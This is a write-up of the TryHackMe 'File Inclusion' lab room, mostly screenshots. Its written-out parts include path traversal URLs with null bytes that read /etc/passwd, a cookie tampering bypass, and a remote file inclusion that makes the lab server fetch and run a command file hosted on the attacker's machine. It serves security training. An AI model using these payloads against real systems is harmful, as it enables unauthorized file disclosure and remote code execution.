# File Inclusion

**Room Link:** [https://tryhackme.com/room/fileinc](https://tryhackme.com/room/fileinc)



**Give Lab #1 a try to read /etc/passwd. What would the request URI be?**

<figure><img src="../../.gitbook/assets/image (16).png" alt=""><figcaption></figcaption></figure>

**In Lab #2, what is the directory specified in the include function?**

<figure><img src="../../.gitbook/assets/image (23) (1).png" alt=""><figcaption></figcaption></figure>

**Give Lab #3 a try to read /etc/passwd. What is the request look like?**

Input field didn't work but we were able to bypass by entering our command in the web browser instead.

**URL:** hxxp://10.10.230.14/lab3.php?file=..//..//../../../etc/passwd%00&#x20;

<figure><img src="../../.gitbook/assets/image (22) (1).png" alt=""><figcaption></figcaption></figure>

**Which function is causing the directory traversal in Lab #4?**

file\_get\_contents

<figure><img src="../../.gitbook/assets/image (34) (1).png" alt=""><figcaption></figcaption></figure>

**Try out Lab #6 and check what is the directory that has to be in the input field?**

THM-profile

<figure><img src="../../.gitbook/assets/image (49) (1).png" alt=""><figcaption></figcaption></figure>

**Try out Lab #6 and read /etc/os-release. What is the VERSION\_ID value**

Only worked in browser

hxxp://10.10.230.14/lab6.php?file=THM-profile//..//..//..//..//etc//os-release%00

<figure><img src="../../.gitbook/assets/image (14) (5).png" alt=""><figcaption></figcaption></figure>

**Capture Flag1 at /etc/flag1**

****

****

<figure><img src="../../.gitbook/assets/image (12) (6).png" alt=""><figcaption></figcaption></figure>



<figure><img src="../../.gitbook/assets/image (17) (3).png" alt=""><figcaption></figcaption></figure>



<figure><img src="../../.gitbook/assets/image (47).png" alt=""><figcaption></figcaption></figure>

<figure><img src="../../.gitbook/assets/image (10) (3).png" alt=""><figcaption></figcaption></figure>

**Capture Flag2 at /etc/flag2**

<figure><img src="../../.gitbook/assets/image (28).png" alt=""><figcaption></figcaption></figure>

Change the value from Guest to Admin and we can bypass the error message above.

<figure><img src="../../.gitbook/assets/image (50) (1).png" alt=""><figcaption></figcaption></figure>

Change the value to the flag and we can see it on the page.

<figure><img src="../../.gitbook/assets/image (31).png" alt=""><figcaption></figcaption></figure>

What it would look like in burp.

<figure><img src="../../.gitbook/assets/image (32).png" alt=""><figcaption></figcaption></figure>

**Capture Flag3 at /etc/flag3**

Page is getting rid of our slashes

<figure><img src="../../.gitbook/assets/image (11) (7).png" alt=""><figcaption></figcaption></figure>

Changing to post and added extra slashed and null character at end.

<figure><img src="../../.gitbook/assets/image (30) (1).png" alt=""><figcaption></figcaption></figure>



**Gain RCE in Lab #Playground /playground.php with RFI to execute the hostname command. What is the output?**

**Kali**

Created the following file to run the hostname command.

****![](<../../.gitbook/assets/image (14) (1).png>)****

**Kali**

Host the file

```
python2 -m SimpleHTTPServer 81
```

**Browser**

```
hxxp://10.10.230.14/playground.php?file=http://10.10.11.193:81/cmd.txt
```

<figure><img src="../../.gitbook/assets/image (10) (1).png" alt=""><figcaption></figcaption></figure>
